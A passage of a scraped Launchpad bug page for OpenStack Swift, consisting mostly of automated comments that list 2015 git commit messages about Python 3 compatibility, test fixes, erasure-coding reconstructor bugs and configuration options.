    Change-Id: If85826243f955d2f03c6ad395215c73daab509b1
    Closes-Bug: #1467677

commit 2289137164231d7872731c2cf3d81b86f34f01a4
Author: John Dickinson &lt;me@not.mn&gt;
Date:   Sat May 23 15:40:03 2015 -0700

    do container listing updates in another (green)thread
    
    The actual server-side changes are simple. The tests are a different
    matter. Many changes were needed to the object server tests to
    handle the now-async calls to the container server. In an effort to
    test this properly, some drive-by changes were made to improve tests.
    
    I tested this patch by doing zero-byte object writes to one container
    as fast as possible. Then I did it again while also saturating 2 of the
    container replica's disks. The results are linked below.
    
    https://gist.github.com/notmyname/2bb85acfd8fbc7fc312a
    
    DocImpact
    
    Change-Id: I737bd0af3f124a4ce3e0862a155e97c1f0ac3e52

commit 62ed4f81ef80440550633eaaaa962a4f9383c2d3
Author: Timur Alperovich &lt;timur.alperovich@gmail.com&gt;
Date:   Tue Jul 14 16:56:44 2015 -0700

    Add two functional tests for delimiter.
    
    The first test verifies that a delimiter will trim entries beyond the
    first matching instance of delimiter (after the given matching prefix,
    if any) and squash duplicates.  So, when setting the delimiter
    to "-", given blobs "test", "test-foo" and "test-bar-baz", we expect
    only "test" (no matching delim) and "test-" (trim all characters after
    the first "-", and squash duplicates).
    
    The second test verifies that when a prefix is provided, the delimiter
    will trim entries beyond the first matching instance of the delimiter
    *after the given prefix*.  So "bar, "bazar" which both match the
    prefix "ba" will be returned as "bar" (no delimiter after the matching
    prefix) and "baza" (after matching the prefix the remainder after the
    the *next* matching delimiter "a" is trimmed).
    
    Change-Id: I49a2aa8722f83e87b7d211e5c26827e93963d92a

commit 2d6c5fe2afde382edb8f04c91fca1911601b61d9
Author: Clay Gerrard &lt;clay.gerrard@gmail.com&gt;
Date:   Tue Jul 21 09:56:13 2015 -0700

    Fix Associated Projects link on Getting Started
    
    Change-Id: I50be656bc5868242489f97c96a1feaef171933e0

commit cd7b2db550e41412281da0256b468c90ebcf3e8b
Author: janonymous &lt;janonymous.codevulture@gmail.com&gt;
Date:   Tue Jul 21 19:23:00 2015 +0530

    unit tests: Replace "self.assert_" by "self.assertTrue"
    
    The assert_() method is deprecated and can be safely replaced by assertTrue().
    This patch makes sure that running the tests does not create undesired
    warnings.
    
    Change-Id: I0602ba39ef93263386644ee68088d5f65fcb4a71

commit c3cc98b2c918476f1b54924e0c54e4c746eba4ac
Author: Samuel Merritt &lt;sam@swiftstack.com&gt;
Date:   Mon Jul 20 17:03:20 2015 -0700

    Add comment about ResumingGetter.used_source_etag
    
    This confused a couple developers and took about ten minutes to
    unravel in IRC; let's leave a clue for the next person.
    
    Change-Id: I356c8c7a44de23f02eaf68d23a39c9eb4c203ff1

commit 06326d74657a8796439988115002298e4a5f4630
Author: janonymous &lt;janonymous.codevulture@gmail.com&gt;
Date:   Mon Jul 20 21:41:58 2015 +0530

    Metaclass Python 3.x Compatibility
    
    use "six.add_metaclass" instead of "__metaclass__"
    
    Change-Id: I57390fec40afe3a965be3215db8f79b9cf862a70

commit 317fa1af49d72ecaf7a9a499d8cdf00a086b4c6f
Author: Azhagu Selvan SP &lt;tamizhgeek@gmail.com&gt;
Date:   Sat Jul 18 14:37:16 2015 +0530

    Minor change in development saio setup doc
    
    Make the test-requirements install command uniform with the rest of the
    setup commands in the page by using the $HOME, instead of hardcoding
    the folder path.
    
    Change-Id: I8da7a191a301601e27f894f8268238d77b150ede

commit 39621b8629c7f378fc197f6ab1ddc8e2e797d1fa
Author: janonymous &lt;janonymous.codevulture@gmail.com&gt;
Date:   Sat Jul 18 14:12:58 2015 +0530

    Deprecated xreadlines() usage fixed
    
    Change-Id: Iadf42c2f86f78c11259e21c88b4aef51db3441ad

commit dde34c4b442a27761f2e6eca46ed9ec47a110392
Author: janonymous &lt;janonymous.codevulture@gmail.com&gt;
Date:   Sat Jul 11 22:46:41 2015 +0530

    Modify zip usage for python3 where necessary.
    
    py2 zip() is eager but py3 zip() and six.moves.zip() are lazy,
    changing ones that require eager evaluation.
    
    Change-Id: Ic9f6bccd7f57772158581905794f8d23b05f4223

commit faff98efd47fd59e28b1adb3e7ad4bc3dc6dd781
Author: janonymous &lt;janonymous.codevulture@gmail.com&gt;
Date:   Thu Jul 9 07:35:47 2015 +0530

    Replace python print operator with print function (pep H233, py33)
    
    'print' function is compatible with 2.x and 3.x python versions
    Link : https://www.python.org/dev/peps/pep-3105/
    
    Python 2.6 has a __future__ import that removes print as language syntax,
    letting you use the functional form instead
    
    Change-Id: I9d9ca5766a2773a7b4071e280f00361d16b85383

commit 8753e452b04b0af6d6b444184b628724e14fbbb1
Author: Victor Stinner &lt;vstinner@redhat.com&gt;
Date:   Wed May 27 18:01:37 2015 +0200

    Replace StringIO with BytesIO for WSGI input
    
    wsgi.input is a binary stream (bytes), not a text stream (unicode).
    
    * Replace StringIO with BytesIO for WSGI input
    * Replace StringIO('') with StringIO() and replace WsgiStringIO('') with
      WsgiStringIO(): an empty string is already the default value
    
    Change-Id: I09c9527be2265a6847189aeeb74a17261ddc781a

commit 6e70f3fa322da70c2a65fb919d200e52fc5add8a
Author: Victor Stinner &lt;vstinner@redhat.com&gt;
Date:   Wed May 27 17:27:47 2015 +0200

    Get StringIO and cStringIO from six.moves
    
    * replace "from cStringIO import StringIO"
      with "from six.moves import cStringIO as StringIO"
    * replace "from StringIO import StringIO"
      with "from six import StringIO"
    * replace "import cStringIO" and "cStringIO.StringIO()"
      with "from six import moves" and "moves.cStringIO()"
    * replace "import StringIO" and "StringIO.StringIO()"
      with "import six" and "six.StringIO()"
    
    This patch was generated by the stringio operation of the sixer tool:
    https://pypi.python.org/pypi/sixer
    
    Change-Id: Iacba77fec3045f96773d1090c0bd48613729a561

commit c366ecf5c85c2797582bf79f7faab1d75b99a70e
Author: janonymous &lt;janonymous.codevulture@gmail.com&gt;
Date:   Mon Jul 13 00:07:13 2015 +0530

    Fix a minor python issue related with string.split
    
    Replacing string.split(value, ',') with value.split(','):
    the string.split() function was removed in Python 3
    
    Change-Id: I9ed241a894ac698da33df75a774a56ae2824fadf

commit c8131c6abb17b00b043a9b95e65be819e1fd3c9d
Author: janonymous &lt;janonymous.codevulture@gmail.com&gt;
Date:   Sun Jul 12 14:48:35 2015 +0530

    sys.exc_type/exc_value/exc_traceback are Deprecated
    
    sys.exc_info() contains a tuple of these three.
    
    Change-Id: I530cbeb37c43da98b4924db41f6604871077bd47

commit 39b6ef6e4fd515d81e688ef365d26d5e0499be7c
Author: Charles Hsu &lt;charles0126@gmail.com&gt;
Date:   Thu Jun 25 02:06:54 2015 +0800

    Fix reconstructor stats mssage.
    
    Calculate reconstruction job count and remaining time that
    would be inappropriate for user. Use real partition count would
    be suitable for user.
    
    Change-Id: I6b025854baf4757dddf9d7fe7bc2cece58a49157
    Closes-Bug: #1468298

commit bfbda38db999ccd881509c68f0319c3d3dae4274
Author: Clay Gerrard &lt;clay.gerrard@gmail.com&gt;
Date:   Tue Jul 7 15:13:20 2015 -0700

    Add save command to ring-builder-analyzer
    
     * cleanup command =&gt; ring builder function mapping
     * cleanup ParseCommandError/ValueError message building
    
    Change-Id: I4be2aa963ce4f43035f02371d8388abd7a76536c

commit c907107fe4eacb378a92799de915234bd72d5d7c
Author: janonymous &lt;janonymous.codevulture@gmail.com&gt;
Date:   Tue Jul 7 22:46:37 2015 +0530

    cPickle is deprecated in py3, replacing it from six.moves
    
    cPickle is deprecated and should be replaced with six.moves
    to provide py2 and py3 compatibility.
    
    Change-Id: Ibad990708722360d188c641e61444d50a16a1e93

commit 86033ba4dcd7b86670306b6e66345ae464caca9d
Author: Alistair Coles &lt;alistair.coles@hp.com&gt;
Date:   Tue Jun 30 18:56:23 2015 +0100

    EC tests should use ECDiskFileManager
    
    Some EC tests in proxy/test_server.py use the replication
    DiskFileManager to open diskfiles. That works because it
    turns out that DiskFileManager is robust to the frag index
    being stitched onto the end of the timestamp in filenames,
    but it would be better to test using the ECDiskFileManager
    for EC diskfiles.
    
    Also, drive-by deletion of some duplicated lines.
    
    Change-Id: Ie3adb607d8c34a469df7d0f6f542ed5ba9a2dac0

commit 7bdb8266d4b926526acdea22e8c9c634855eeecc
Author: Thiago da Silva &lt;thiago@redhat.com&gt;
Date:   Wed Mar 25 13:19:36 2015 +0000

    Select policy when running functional test
    
    Add ability to select a storage policy when running
    the functional tests by defining the environment variable
    SWIFT_TEST_POLICY.
    
    This patch was first introduced by Janie Richling in
    feature/ec: https://review.openstack.org/#/c/166097
    
    Co-Authored-By: Janie Richling &lt;jrichli@us.ibm.com&gt;
    Co-Authored-By: Christian Schwede &lt;christian.schwede@enovance.com&gt;
    Co-Authored-By: Kota Tsuyuzaki &lt;tsuyuzaki.kota@lab.ntt.co.jp&gt;
    Co-Authored-By: Alistair Coles &lt;alistair.coles@hp.com&gt;
    
    Change-Id: Id96354546088df137def0ae7fd434baf64ed0c51
    Signed-off-by: Thiago da Silva &lt;thiago@redhat.com&gt;
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>tags</b>:
      </td>
      <td>
        added: in-feature-hummingbird
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/swift/+bug/1453948/comments/37" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-21T03:37:20.993628+00:00" title="2015-09-21 03:37:20 UTC">on 2015-09-21</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/swift/+bug/1453948/comments/37">
                <strong>Related fix proposed to swift (feature/crypto)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/swift/+bug/1453948/comments/37"> #37</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Related fix proposed to branch: feature/crypto<br />
Review: <a rel="nofollow" href="https://review.openstack.org/225540">https:/<wbr />/review.<wbr />openstack.<wbr />org/225540</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Related fix proposed to branch: feature/crypto
Review: https://review.openstack.org/225540</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/swift/+bug/1453948/comments/38" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-21T03:39:38.294123+00:00" title="2015-09-21 03:39:38 UTC">on 2015-09-21</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/swift/+bug/1453948/comments/38">
                <strong>Change abandoned on swift (feature/crypto)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/swift/+bug/1453948/comments/38"> #38</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Change abandoned by John Dickinson (&lt;email address hidden&gt;) on branch: feature/crypto<br />
Review: <a rel="nofollow" href="https://review.openstack.org/225540">https:/<wbr />/review.<wbr />openstack.<wbr />org/225540</a><br />
Reason: jrichli will do this</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Change abandoned by John Dickinson (me@not.mn) on branch: feature/crypto
Review: https://review.openstack.org/225540
Reason: jrichli will do this</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/swift/+bug/1453948/comments/39" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-21T23:08:55.982577+00:00" title="2015-09-21 23:08:55 UTC">on 2015-09-21</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/swift/+bug/1453948/comments/39">
                <strong>Related fix merged to swift (feature/crypto)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/swift/+bug/1453948/comments/39"> #39</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  <a href="https://bugs.launchpad.net/swift/+bug/1453948/comments/39/+download">Download full text</a> (12.2 KiB)
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Reviewed:  <a rel="nofollow" href="https://review.openstack.org/225540">https:/<wbr />/review.<wbr />openstack.<wbr />org/225540</a><br />
Committed: <a rel="nofollow" href="https://git.openstack.org/cgit/openstack/swift/commit/?id=1936299943116abcedd8b36fb8b64c724e539ab7">https:/<wbr />/git.openstack.<wbr />org/cgit/<wbr />openstack/<wbr />swift/commit/<wbr />?id=19362999431<wbr />16abcedd8b36fb8<wbr />b64c724e539ab7</a><br />
Submitter: Jenkins<br />
Branch:    feature/crypto</p>
<p>commit 9e95613d717489d<wbr />a584531e220db20<wbr />d1b8f43c51<br />
Author: Alistair Coles &lt;email address hidden&gt;<br />
Date:   Mon Sep 21 10:01:54 2015 +0100</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Fix .coveragrc to prevent nose tests error</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Since v4.0 the coverage package raises an error if unrecognized<br />
&nbsp;&nbsp;&nbsp;&nbsp;options are found in .coveragrc [1]. Previously they were ignored. The<br />
&nbsp;&nbsp;&nbsp;&nbsp;ignore-errors option therefore causes nosetests with coverage to error<br />
&nbsp;&nbsp;&nbsp;&nbsp;because the option should be ignore_errors (underscore not hyphen).</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;[1] <a rel="nofollow" href="https://bitbucket.org/ned/coveragepy/src/tip/CHANGES.rst">https:/<wbr />/bitbucket.<wbr />org/ned/<wbr />coveragepy/<wbr />src/tip/<wbr />CHANGES.<wbr />rst</a></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: Ic488801b7cc432<wbr />17f9e2a4ed945e0<wbr />6505b667608</p>
<p>commit 1fe8e4327b15f89<wbr />33efef185d09b60<wbr />67d1f28716<br />
Author: Clay Gerrard &lt;email address hidden&gt;<br />
Date:   Fri Sep 18 13:54:52 2015 -0700</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Fix recon tests on SAIO with multiple policies</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Recon middleware used to only look on rings that exist on disk when it was<br />
&nbsp;&nbsp;&nbsp;&nbsp;started, so if a test didn&#x27;t create a ring in the temp swift_dir it can expect<br />
&nbsp;&nbsp;&nbsp;&nbsp;the middleware to not report it.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;However, after we started looking at policies to determine rings [1] - we need<br />
&nbsp;&nbsp;&nbsp;&nbsp;to be more careful to patch policies to match up with the test requirements.<br />
&nbsp;&nbsp;&nbsp;&nbsp;On development environments with only the legacy default polices the existing<br />
&nbsp;&nbsp;&nbsp;&nbsp;recon tests were passing by accident - but not in my environment.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;This change will patch policies for the TestCase so that tests will pass for<br />
&nbsp;&nbsp;&nbsp;&nbsp;me.  Individual test methods that have more specific policy requirements for<br />
&nbsp;&nbsp;&nbsp;&nbsp;the test can continue to @patch_policies just for those tests but in general<br />
&nbsp;&nbsp;&nbsp;&nbsp;the existing test_methods all seem to expect legacy policies - so we just make<br />
&nbsp;&nbsp;&nbsp;&nbsp;the default for the TestCase legacy_only.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: I778a0a59091ca8<wbr />870e1cab985f3ec<wbr />426eb045ab7</p>
<p>commit a63f70c17d39237<wbr />9ec75045a94c38a<wbr />96878b4c5c<br />
Author: Minwoo Bae &lt;email address hidden&gt;<br />
Date:   Wed Sep 9 15:33:45 2015 -0500</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Reconstructor logging to omit 404 warnings</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Currently, the replicator does not log warning messages<br />
&nbsp;&nbsp;&nbsp;&nbsp;for 404 responses. We would like the reconstructor to<br />
&nbsp;&nbsp;&nbsp;&nbsp;do the same, as 404s are not considered unusual, and<br />
&nbsp;&nbsp;&nbsp;&nbsp;are already handled by the object server.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: Ia927bf30362548<wbr />832e9f451923ff9<wbr />4053e11b758<br />
&nbsp;&nbsp;&nbsp;&nbsp;Closes-Bug: #1491883</p>
<p>commit 530102ae07ea27b<wbr />4a994e4b1fb2f59<wbr />0700cfef0c<br />
Author: Bill Huber &lt;email address hidden&gt;<br />
Date:   Mon Sep 14 16:01:39 2015 -0500</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Update EC Support on how to build an EC ring with replicas count</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;This doc is being updated to specify the replicas count parameter<br />
&nbsp;&nbsp;&nbsp;&nbsp;to build an EC ring that enforces both data and parity placements<br />
&nbsp;&nbsp;&nbsp;&nbsp;for each partition.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: I770ad268e4017e<wbr />610be3357e89b89<wbr />f0b7d3c18af<br />
&nbsp;&nbsp;&nbsp;&nbsp;Closes-Bug: 1487203</p>
<p>commit 0d9142abd45f189<wbr />b15eaec1a25464e<wbr />d7d1859f97<br />
Author: Clay Gerrard &lt;email address hidden&gt;<br />
Date:   Mon Sep 14 17:17:29 2015 -0700</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Fix typo in Deployment Guide and add some formatting</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: I58703162bf3e9f<wbr />39656a5e511bd8f<wbr />e845793bca2</p>
<p>commit 460a7e4b64d134d<wbr />1fd47f09924d594<wbr />196b6..<wbr />.</p></div>
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Reviewed:  https://review.openstack.org/225540
Committed: https://git.openstack.org/cgit/openstack/swift/commit/?id=1936299943116abcedd8b36fb8b64c724e539ab7
Submitter: Jenkins
Branch:    feature/crypto

commit 9e95613d717489da584531e220db20d1b8f43c51
Author: Alistair Coles &lt;alistair.coles@hp.com&gt;
Date:   Mon Sep 21 10:01:54 2015 +0100

    Fix .coveragrc to prevent nose tests error
    
    Since v4.0 the coverage package raises an error if unrecognized
    options are found in .coveragrc [1]. Previously they were ignored. The
    ignore-errors option therefore causes nosetests with coverage to error
    because the option should be ignore_errors (underscore not hyphen).
    
    [1] https://bitbucket.org/ned/coveragepy/src/tip/CHANGES.rst
    
    Change-Id: Ic488801b7cc43217f9e2a4ed945e06505b667608

commit 1fe8e4327b15f8933efef185d09b6067d1f28716
Author: Clay Gerrard &lt;clay.gerrard@gmail.com&gt;
Date:   Fri Sep 18 13:54:52 2015 -0700

    Fix recon tests on SAIO with multiple policies
    
    Recon middleware used to only look on rings that exist on disk when it was
    started, so if a test didn't create a ring in the temp swift_dir it can expect
    the middleware to not report it.
    
    However, after we started looking at policies to determine rings [1] - we need
    to be more careful to patch policies to match up with the test requirements.
    On development environments with only the legacy default polices the existing
    recon tests were passing by accident - but not in my environment.
    
    This change will patch policies for the TestCase so that tests will pass for
    me.  Individual test methods that have more specific policy requirements for
    the test can continue to @patch_policies just for those tests but in general
    the existing test_methods all seem to expect legacy policies - so we just make
    the default for the TestCase legacy_only.
    
    Change-Id: I778a0a59091ca8870e1cab985f3ec426eb045ab7

commit a63f70c17d392379ec75045a94c38a96878b4c5c
Author: Minwoo Bae &lt;minwoob@us.ibm.com&gt;
Date:   Wed Sep 9 15:33:45 2015 -0500

    Reconstructor logging to omit 404 warnings
    
    Currently, the replicator does not log warning messages
    for 404 responses. We would like the reconstructor to
    do the same, as 404s are not considered unusual, and
    are already handled by the object server.
    
    Change-Id: Ia927bf30362548832e9f451923ff94053e11b758
    Closes-Bug: #1491883

commit 530102ae07ea27b4a994e4b1fb2f590700cfef0c
Author: Bill Huber &lt;wbhuber@us.ibm.com&gt;
Date:   Mon Sep 14 16:01:39 2015 -0500

    Update EC Support on how to build an EC ring with replicas count
    
    This doc is being updated to specify the replicas count parameter
    to build an EC ring that enforces both data and parity placements
    for each partition.
    
    Change-Id: I770ad268e4017e610be3357e89b89f0b7d3c18af
    Closes-Bug: 1487203

commit 0d9142abd45f189b15eaec1a25464ed7d1859f97
Author: Clay Gerrard &lt;clay.gerrard@gmail.com&gt;
Date:   Mon Sep 14 17:17:29 2015 -0700

    Fix typo in Deployment Guide and add some formatting
    
    Change-Id: I58703162bf3e9f39656a5e511bd8fe845793bca2

commit 460a7e4b64d134d1fd47f09924d594196b6458d4
Author: Brian Cline &lt;bcline@softlayer.com&gt;
Date:   Wed Sep 2 04:13:29 2015 -0500

    Fixes recon bug with initially missing rings
    
    Previously the recon middleware was doing a basic scan for object
    rings that exist at init time. In situations where an object-server
    was started without an object ring present, but received one shortly
    after, recon still would not report it in the /recon/ringmd5 response.
    This persists even when object-server gleefully chugs along after
    picking up the ring, and recon's behavior would only be corrected by
    an object-server reload/restart.
    
    This change brings the middleware a bit more up to date to use the
    common POLICIES instance to determine what policies were already loaded
    based on configuration, and derives the path for each ring.
    
    This effectively makes the config the source of truth for what rings
    *should* be present, rather than what's present at startup. Since we
    already dynamically check in ReconMiddleware.get_ring_md5 whether each
    of the predetermined ring files exist, recon now correctly reports a
    previously-missing ring whenever it falls into place.
    
    Change-Id: Ia079418e54ffac5e01ef6a15511f5069b7fe83ea

commit 9324ce83c6dcbf5fb4ffefdc781eec5db1b946c9
Author: Bill Huber &lt;wbhuber@us.ibm.com&gt;
Date:   Tue Sep 8 16:11:33 2015 -0500

    Reconstructor GET excludes user_agent in log
    
    To make it easier for users to deduce in the log to find out
    where the request originates from, it is necessary to include
    the user_agent field in the reconstructor for a GET method
    and to have this particular log consistent with other servers'
    methods.
    
    Change-Id: I0ca7443436e97c2db64c966ab4d73c5c12a1f059
    Closes-Bug: 1491871
    Co-Authored-By: Kota Tsuyuzakai &lt;tsuyuzaki.kota@lab.ntt.co.jp&gt;

commit 369447ec47dc8df3e38046a305cf1aa0a6499ce9
Author: Clay Gerrard &lt;clay.gerrard@gmail.com&gt;
Date:   Thu Aug 27 15:09:29 2015 -0700

    Fix purge for tombstone only REVERT job
    
    When we revert a partition we normally push it off to the specific
    primary node for the index of the data files in the partition.  However,
    when a partition is devoid of any data files (only tombstones) we build
    a REVERT job with a frag_index of None.
    
    This change updates the ECDiskFile's purge method to be robust to
    purging tombstones when the frag_index is None.
    
    Add probetest to validate tombstone only revert jobs will clean
    themselves up if they can validate they're in-sync with part-replica
    count nodes - even if one of the primaries is down (in which case they
    sync tombstones with other handoffs to fill in for the primaries)
    
    Change-Id: Ib9a42f412fb90d51959efce886c0f8952aba8d85

commit a3facce53cac0497edb326a93a97f24e02c603ab
Author: paul luse &lt;paul.e.luse@intel.com&gt;
Date:   Thu Aug 27 11:02:27 2015 -0700

    Fix invalid frag_index header in ssync_sender when reverting EC tombstones
    
    Back in d124ce [1] we failed to recognize the situation where a revert
    job would have an explicit frag_index key wth the literal value None
    which would take precedence over the dict.get's default value of ''.
    Later in ssync_receiver we'd bump into the ValueError converting 'None'
    to an int (again).
    
    In ssync_sender we now handle literal None's correctly and should
    hopefully no longer put this invalid headers on the wire - but for belts
    and braces we'll also update ssync_receiver to raise a 400 series error
    and ssync_sender to better log the error messages.
    
    1. https://review.openstack.org/#/c/195457/
    
    Co-Author: Clay Gerrard &lt;clay.gerrard@gmail.com&gt;
    Co-Author: Alistair Coles &lt;alistair.coles@hp.com&gt;
    Change-Id: Ic71ba7cc82487773214030207bb193f425319449
    Closes-Bug: 1489546

commit 71f6fd025ea013bc457450a5cc4f8e92c6df92cc
Author: Romain LE DISEZ &lt;romain.ledisez@ovh.net&gt;
Date:   Tue Jun 16 12:47:26 2015 +0200

    Allows to configure the rsync modules where the replicators will send data
    
    Currently, the rsync module where the replicators send data is static. It
    forbids administrators to set rsync configuration based on their current
    deployment or needs.
    
    As an example, the rsyncd configuration example encourages to set a connections
    limit for the modules account, container and object. It permits to protect
    devices from excessives parallels connections, because it would impact
    performances.
    
    On a server with many devices, it is tempting to increase this number
    proportionally, but nothing guarantees that the distribution of the connections
    will be balanced. In the worst scenario, a single device can receive all the
    connections, which is a severe impact on performances.
    
    This commit adds a new option named 'rsync_module' to the *-replicator sections
    of the *-server configuration file. This configuration variable can be
    extrapolated with device attributes like ip, port, device, zone, ... by using
    the format {NAME}. eg:
        rsync_module = {replication_ip}::object_{device}
    
    With this configuration, an administrators can solve the problem of connections
    distribution by creating one module per device in rsyncd configuration.
    
    The default values are backward compatible:
        {replication_ip}::account
        {replication_ip}::container
        {replication_ip}::object
    
    Option vm_test_mode is deprecated by this commit, but backward compatibility is
    maintained. The option is only effective when rsync_module is not set. In that
    case, {replication_port} is appended to the default value of rsync_module.
    
    Change-Id: Iad91df50dadbe96c921181797799b4444323ce2e

commit cb683d391cb66d0f52830de16760c80fd2afedf9
Author: OpenStack Proposal Bot &lt;openstack-infra@lists.openstack.org&gt;
Date:   Sat Sep 5 06:17:51 2015 +0000

    Imported Translations from Transifex
    
    For more information about this automatic import see:
    https://wiki.openstack.org/wiki/Translations/Infrastructure
    
    Change-Id: I2d92b8e34a665fb0bb4c048cfb0c59de295dfce6

commit e4542455c8a07b7981c247df8b737816062c1655
Author: Emett Speer &lt;speer.emett@gmail.com&gt;
Date:   Wed Sep 2 17:18:03 2015 -0700

    [Labs] Update links to Cloud Admin Guide
    
    Update links to the Cloud Admin Guide after the
    RST conversion of that book altered URLs.
    
    Change-Id: I899f8938498b744e62887968a65e58c00ef27f1b

commit 58fcc07523978306cd3889ada73af5d9e664cf59
Author: Christian Schwede &lt;cschwede@redhat.com&gt;
Date:   Wed Sep 2 10:52:34 2015 +0000

    Test if container_sweep is executed on unmounted devices
    
    This change ensures that container_sweep is not run if a device is not mounted
    and mount_check is set to True.
    
    Change-Id: I823083c8431d9e61fd426508033ec9188503957b

commit 615c7a204b9386e05c5bab658bfe96766ad1e680
Author: Brian Cline &lt;bcline@softlayer.com&gt;
Date:   Tue Sep 1 10:51:20 2015 -0500

    Adds useful dispersion info from changelog
    
    Change-Id: I1a45088fc32620b02ff9a754b02ec1eb75a59d6e

commit 3b8755098a1786c5447abf158bd686293a82977c
Author: janonymous &lt;janonymous.codevulture@gmail.com&gt;
Date:   Sun Aug 2 21:29:13 2015 +0530

    Replace a / b with a // b to use integer division where needed
    
    Change-Id: I72c81faa62786e140b0de00e3a04934bf1b5adbd

commit 58a10a5fffec69304d7bcce0f1c43bd2a9f9ff52
Author: Alistair Coles &lt;alistair.coles@hp.com&gt;
Date:   Wed Aug 26 16:30:23 2015 +0100

    Add test that a tempurl POST cannot set a DLO manifest header
    
    Follow up to [1] to add tests for tempurl POSTs not being allowed
    to set a DLO manifest header.
    
    [1] I11e68830009d3f6bff44ae4011a41b67139146f6
    
    Change-Id: I7c0ad5a936f71e56c599b8495a586913d3334422
